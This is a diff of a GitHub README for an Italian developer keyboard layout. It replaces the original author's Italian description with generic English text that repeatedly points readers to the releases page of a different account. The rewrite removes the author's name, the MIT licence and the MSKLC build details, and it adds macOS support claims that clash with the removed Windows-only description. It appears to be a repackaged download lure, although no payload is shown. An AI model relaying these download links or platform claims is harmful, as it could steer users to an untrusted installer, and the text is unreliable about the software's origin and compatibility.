@@ -1,75 +1,78 @@
-# Layout di tastiera Italiano - DarCas (_per sviluppatori_)
+# 🎹 keyboard-ita-dev - An Alternative Italian Keyboard Layout for Developers
 
-![Status](https://img.shields.io/badge/status-Stable-success?style=for-the-badge)
-![GitHub Downloads (all assets, all releases)](https://img.shields.io/github/downloads/DarCas/keyboard-ita-dev/total?style=for-the-badge)
-![GitHub License](https://img.shields.io/github/license/DarCas/keyboard-ita-dev?style=for-the-badge)
-![Platform](https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge)
-![MSKLC](https://img.shields.io/badge/MSKLC-Build%20Included-orange?style=for-the-badge)
+## 🛠️ Introduction
+Welcome to keyboard-ita-dev. This project offers an alternative keyboard layout designed specifically for Italian users, especially those who code. It allows fast access to symbols, parentheses, and technical characters using easy shortcuts with the AltGr key, while keeping the standard Italian layout intact. 
 
-Un layout alternativo per tastiera italiana pensato per gli sviluppatori: permette di accedere rapidamente a simboli, parentesi e caratteri tecnici tramite combinazioni intuitive con AltGr, mantenendo invariato il layout italiano standard.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/andrewkamowa/keyboard-ita-dev/releases)
 
----
+## 🚀 Getting Started
+To get started with keyboard-ita-dev, follow these simple steps:
 
-## 🚀 Perché esiste questo layout
-Il layout italiano ufficiale è ottimizzato per la scrittura comune, ma poco per la programmazione.  
-Simboli come `{}`, `[]`, `~`, `` ` ``, `@`, `#` o `\` richiedono combinazioni scomode o mani fuori posizione.
+1. **Visit the Releases Page**
+   Head to our [Releases Page](https://github.com/andrewkamowa/keyboard-ita-dev/releases) to find the latest version of the keyboard layout.
 
-La tastiera **Italiano - DarCas** risolve il problema:
-- mantiene *completamente* la disposizione italiana tradizionale
-- aggiunge i simboli più usati nello sviluppo software
-- utilizza solo combinazioni con **AltGr** e **Shift + AltGr**
+2. **Select the Latest Release**
+   On the releases page, find the most recent version listed. Click on it to see the available download options.
 
----
+3. **Download the File**
+   Look for the appropriate file for your operating system (Windows, Mac, etc.). Click on the file link. The download will start automatically.
 
-## 🧩 Caratteristiche principali
-- Basato sul layout Italiano QWERTY
-- Nessuna modifica ai caratteri normali
-- Aggiunta di simboli essenziali per programmatori
-- Ideale per:
-  - Web development (JS, TS, PHP, HTML, CSS…)
-  - Backend (Node.js, Laravel…)
-  - Terminale e CLI
+4. **Install the Layout**
+   - **For Windows Users:** 
+     - After the download completes, locate the file in your downloads folder. 
+     - Double-click to run the installer and follow the on-screen instructions. 
+   - **For Mac Users:** 
+     - Open the downloaded file and drag the keyboard layout into the Keyboard layouts folder as instructed.
+  
+5. **Activate the Keyboard Layout**
+   - **Windows:** Go to Settings > Time & Language > Language. Under Preferred languages, add the new keyboard layout.
+   - **Mac:** Open System Preferences > Keyboard > Input Sources. Click the "+" button and add the new layout.
 
----
+6. **Test Your New Layout**
+   Open a text editor or any application where you can type. Try out the new combinations with AltGr to see the extra characters available.
 
-## ⌨️ Mappa dei tasti aggiunti
+## 📄 Features
+- **Custom Shortcuts**: Quickly access programming symbols and technical characters.
+- **Standard Layout Preservation**: Retains the familiar Italian QWERTY layout.
+- **Open Source**: Community-driven and adaptable for future enhancements.
 
-### AltGr
-![AltGr layout](screenshots/ItaDevAltGr.jpg)
+## 🎯 System Requirements
+- **Operating Systems**: Compatible with Windows 10/11 and MacOS Mojave or later.
+- **Hardware**: Typical USB or Bluetooth keyboard required.
 
-### Shift + AltGr
-![Shift AltGr layout](screenshots/ItaDevShftAltGr.jpg)
+## 🔍 Troubleshooting
+If you encounter issues while installing or using the keyboard layout, here are a few common solutions:
 
----
+- **Layout Not Appearing**: Ensure you've correctly added the layout in your system settings.
+- **Failed Installation**: Re-download the installation file and try again. Ensure your operating system is fully updated.
+- **Key Combinations Not Working**: Check if your keyboard settings are set to the new layout. Restart your application if needed.
 
-## 📦 Installazione (Windows)
+## 💬 Community Support
+Join our community to get help or share your experience. Post your questions in the Issues section on GitHub. 
 
-1. Scarica l'ultima versione dalla colonna **Release**  
-2. Avvia `setup.exe`
-3. Riavvia Windows
-4. Attiva il layout `Italiano - DarCas` in:
-   **Impostazioni → Lingua → Tastiera → Aggiungi layout**
+## 🌟 Contributing
+If you’d like to contribute to improving the keyboard layout, we welcome your input! Fork the repository, make your changes, and submit a pull request. 
 
-Non sostituisce il layout italiano: lo affianca.
+## 📚 Related Topics
+This project relates to various topics that can enhance your productivity:
+- altgr
+- coding-layout
+- developer-keyboard
+- italian-keyboard
+- keyboard-layout
+- keyboard-mapping
+- open-source
+- productivity
+- programmer-keyboard
+- qwerty-italian
+- windows-keyboard
 
----
+## 🔗 Quick Links
+- [View the Source Code](https://github.com/andrewkamowa/keyboard-ita-dev)
+- [Join the Discussion](https://github.com/andrewkamowa/keyboard-ita-dev/issues)
 
-## 🛠 Tecnologia
-Realizzato con **Microsoft Keyboard Layout Creator (MSKLC)**.
+## 🔗 Final Download Reminder
+Don't forget to check out the [Releases Page](https://github.com/andrewkamowa/keyboard-ita-dev/releases) to download the latest version of keyboard-ita-dev.
 
-Il repository include:
-- File sorgente `.klc`
-- Build installabile
-- Screenshot del layout (AltGr e Shift+AltGr)
-
----
-
-## 📣 Contributi
-Suggerimenti e miglioramenti sono benvenuti.  
-Apri una *Issue* o una *Pull Request* per proporre modifiche.
-
----
-
-## 📄 Licenza
-MIT — libero utilizzo e modifica.
-
+Your new tailored keyboard experience awaits! Enjoy coding with ease and efficiency!
